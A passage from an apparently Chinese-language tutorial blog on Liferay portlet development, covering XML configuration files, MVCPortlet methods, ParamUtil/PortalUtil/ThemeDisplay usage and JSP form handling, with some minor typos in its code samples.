class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/html/hello/help.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>about-template<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/html/hello/about.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>expiration-cache</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>expiration-cache</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 支持的模式：每个模式对应一个上面的 jsp 文件 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>supports</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mime-type</span><span class="token punctuation">&gt;</span></span>text/html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mime-type</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- 显示模式 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>view<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- 编辑模式 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>edit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- 帮助模式 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>help<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- 显示模式 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>about<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-mode</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>supports</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-info</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>short-title</span><span class="token punctuation">&gt;</span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>short-title</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>keywords</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>keywords</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-info</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>administrator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>power-user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security-role-ref</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security-role-ref</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这个东西貌似也可以在你创建的 Portlet.java 文件中用注解的方式表示, 有空试试~</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&gt;</span><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span>immediate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span>property <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"com.liferay.portlet.display-category=category.sample"</span><span class="token punctuation">,</span><span class="token string">"com.liferay.portlet.instanceable=true"</span><span class="token punctuation">,</span><span class="token string">"javax.portlet.display-name=HelloPortlet Portlet"</span><span class="token punctuation">,</span><span class="token string">"javax.portlet.init-param.template-path=/"</span><span class="token punctuation">,</span><span class="token comment">//"javax.portlet.init-param.name=view-template",</span><span class="token string">"javax.portlet.init-param.view-template=/html/hello/view.jsp"</span><span class="token punctuation">,</span><span class="token string">"javax.portlet.name="</span> <span class="token operator">+</span> <span class="token class-name">HelloPortletKeys<span class="token punctuation">.</span>Hello</span><span class="token punctuation">,</span><span class="token string">"javax.portlet.resource-bundle=content.Language"</span><span class="token punctuation">,</span><span class="token string">"javax.portlet.security-role-ref=power-user,user"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>service <span class="token operator">=</span> <span class="token class-name">Portlet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloPortlet</span> <span class="token keyword">extends</span> <span class="token class-name">MVCPortlet</span> <span class="token punctuation">{</span><span class="token operator">&gt;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><br><h4 id="liferay-portlet-xml"><a href="#liferay-portlet-xml" class="headerlink" title="liferay-portlet.xml"></a>liferay-portlet.xml</h4><h5 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h5><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-mapper</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>administrator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-link</span><span class="token punctuation">&gt;</span></span>Administrator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-mapper</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-mapper</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-link</span><span class="token punctuation">&gt;</span></span>Guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-mapper</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-mapper</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>power-user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-link</span><span class="token punctuation">&gt;</span></span>Power User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-mapper</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-mapper</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-name</span><span class="token punctuation">&gt;</span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role-link</span><span class="token punctuation">&gt;</span></span>User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>role-mapper</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h5 id="portlet-配置"><a href="#portlet-配置" class="headerlink" title="portlet 配置"></a>portlet 配置</h5><p>同样每创建一个 portlet 也会在此文件里添加一些该 portlet 的相关配置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 与 portlet.xml 中的 name 关联 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet-name</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 页面标题前面显示的图标 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>icon</span><span class="token punctuation">&gt;</span></span>/icon.png<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>icon</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 是否可以实例多次，默认 false 只能添加一次 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>instanceable</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>instanceable</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- jsp 表单中是否需要填写 namespace，默认 true 必须填写 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>requires-namespaced-parameters</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>requires-namespaced-parameters</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 引入的 css 文件 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header-portlet-css</span><span class="token punctuation">&gt;</span></span>/css/main.css<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header-portlet-css</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 引入的 js 文件 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer-portlet-javascript</span><span class="token punctuation">&gt;</span></span>/js/main.js<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer-portlet-javascript</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>css-class-wrapper</span><span class="token punctuation">&gt;</span></span>hello-portlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>css-class-wrapper</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="liferay-desplay-xml"><a href="#liferay-desplay-xml" class="headerlink" title="liferay-desplay.xml"></a>liferay-desplay.xml</h4><p>用来设置每个 portlet 的分类，根据 portlet id</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 类别名称 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category.sample<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 对应 portlet.xml 中的 portlet-name 属性--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LiferayTest<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token comment">&lt;!-- 这种写法也可以 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>portletName<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>portlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>category</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 当然也可以自定义分类, 若要显示中文可通过国际化配置 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>baozi<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>portlet</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hello<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>category</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h2 id="常用-API"><a href="#常用-API" class="headerlink" title="常用 API"></a>常用 API</h2><h3 id="MVCPortlet"><a href="#MVCPortlet" class="headerlink" title="MVCPortlet"></a>MVCPortlet</h3><h4 id="doView"><a href="#doView" class="headerlink" title="doView"></a>doView</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doView</span><span class="token punctuation">(</span><span class="token class-name">RenderRequest</span> renderRequest<span class="token punctuation">,</span>        <span class="token class-name">RenderResponse</span> renderResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">PortletException</span> <span class="token punctuation">{</span>    <span class="token comment">//从前台接收数据</span>    <span class="token class-name">String</span> userName <span class="token operator">=</span> renderRequest<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"uName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//向前台传数据</span>    renderRequest<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"后台传回来的数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doView</span><span class="token punctuation">(</span>renderRequest<span class="token punctuation">,</span> renderResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该方法会在页面显示该 portlet 时执行</p><blockquote><p>页面中的 portlet 显示 “此 portlet 已被卸载。请重新部署或将其从页面删除” 时，一般是因为控件还未部署完成，部署完成后刷新页面即可</p></blockquote><br><h4 id="自定义-Action-方法"><a href="#自定义-Action-方法" class="headerlink" title="自定义 Action 方法"></a>自定义 Action 方法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">ActionRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ActionResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 接收参数</span>    <span class="token class-name">String</span> userName <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"uName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 重定向</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        <span class="token comment">// response.sendRedirect("/html/hello/edit.jsp");</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过注解调用该方法，效果与上面相同</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ProcessAction</span><span class="token punctuation">(</span>name<span class="token operator">=</span>"update<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">updateMethod</span><span class="token punctuation">(</span><span class="token class-name">ActionRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ActionResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">String</span> userName <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"uName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="processAction"><a href="#processAction" class="headerlink" title="processAction"></a>processAction</h4><p>如果 <a href="#actionURL"><code>&lt;portlet:actionURL&gt;</code></a> 没有 name 属性则会进入这个方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doView</span><span class="token punctuation">(</span><span class="token class-name">RenderRequest</span> renderRequest<span class="token punctuation">,</span><span class="token class-name">RenderResponse</span> renderResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">PortletException</span> <span class="token punctuation">{</span><span class="token comment">// TODO Auto-generated method stub</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doView</span><span class="token punctuation">(</span>renderRequest<span class="token punctuation">,</span> renderResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>                                                               ```<span class="token generics"><span class="token punctuation">&lt;</span>br<span class="token punctuation">&gt;</span></span>### <span class="token class-name">ParamUtil</span>#### <span class="token function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>该方法可以自动判空：若为空则赋值为默认值，省略默认值则为空字符串```java<span class="token class-name">String</span> userName <span class="token operator">=</span> <span class="token class-name">ParamUtil</span><span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>renderRequest<span class="token punctuation">,</span> <span class="token string">"uName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 或</span><span class="token class-name">String</span> userName <span class="token operator">=</span> <span class="token class-name">ParamUtil</span><span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>renderRequest<span class="token punctuation">,</span> <span class="token string">"uName"</span><span class="token punctuation">,</span> <span class="token string">"baozi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>同样的还有 <code>getInteger()</code>、<code>getBoolean()</code>、<code>getDate()</code> 等等<br>但是注意，Integer 类型会进行类型转换，若<font color="#FF6633">转换失败</font>则赋值为默认值</p></blockquote><br><h3 id="PortalUtil"><a href="#PortalUtil" class="headerlink" title="PortalUtil"></a>PortalUtil</h3><p>该类可以去到很多方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*============================对象获取=======================*/</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment">//获取用户</span>    <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token class-name">PortalUtil</span><span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span>renderRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//获取公司 getCompany</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PortalException</span> <span class="token operator">|</span> <span class="token class-name">SystemException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*============================值获取===========================*/</span><span class="token comment">//获取用户 id</span><span class="token keyword">long</span> userId <span class="token operator">=</span> <span class="token class-name">PortalUtil</span><span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span>httpServletRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> userId <span class="token operator">=</span> <span class="token class-name">PortalUtil</span><span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span>portletRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getScopeGroupId</span><span class="token comment">//getCompanyId</span><span class="token comment">//获取当前端口 getPortalPort</span><span class="token comment">//获取当前地址 getPortalUrl(renderRequest)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="ThemeDisplay"><a href="#ThemeDisplay" class="headerlink" title="ThemeDisplay"></a>ThemeDisplay</h3><p>该对象可以获取各种显示相关的信息</p><p>获取方式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取 ThemeDisplay</span><span class="token class-name">ThemeDisplay</span> themeDisplay <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ThemeDisplay</span><span class="token punctuation">)</span>renderRequest<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token class-name">WebKes</span><span class="token punctuation">.</span><span class="token constant">THTME_DISPLAY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><h2 id="页面显示"><a href="#页面显示" class="headerlink" title="页面显示"></a>页面显示</h2><p>在 portlet.xml 中指定了每个 portlet 对应的 jsp 文件，这里不再赘述</p><h3 id="引用-portlet-对象"><a href="#引用-portlet-对象" class="headerlink" title="引用 portlet 对象"></a>引用 portlet 对象</h3><p>首先要在 jsp 页面中引入 <a href="#defineObjects">portlet 内置对象</a>否则无法调用 portlet 的 java 对象：</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:defineObjects /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="引用-js-和-css"><a href="#引用-js-和-css" class="headerlink" title="引用 js 和 css"></a>引用 js 和 css</h3><p>因为 liferay 开发实际是在写代码片段，所以必须要写全路径 <code>&lt;%= renderRequest.getContextPath()%&gt;</code></p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script type="text/javascript" src="&lt;%= renderRequest.getContextPath()%&gt;/js/jquery.js"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>相对路径是绝对无法取到的</p></blockquote><br><h3 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h3><p>通过 java 代码 <code>(String)renderRequest.getAttribute("data");</code> 或 EL 表达式 <code>${data}</code>获取后台传回来的属性值</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;!-- EL 表达式获取数据 --&gt;这是${data}.&lt;!-- java 代码获取数据 --&gt;&lt;% String data = (String)renderRequest.getAttribute("data"); %&gt;&lt;!-- 显示数据 --&gt;&lt;%=data %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h3><p>使用 Liferay 提交表单需要先引用标签 <code>actionURL</code> 或 <code>renderURL</code></p><ol><li><p>actionURL：提交到指定方法中, 例如在后台自定义 [<code>update</code>](#自定义 Action 方法) 方法，则 name 属性为 update</p> <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">portlet:</span>actionURL</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updateForm<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>update<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">portlet:</span>actionURL</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 也可以在 action 中添加额外参数 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%updateURL%&gt;&amp;otherParm=other<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uName<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span 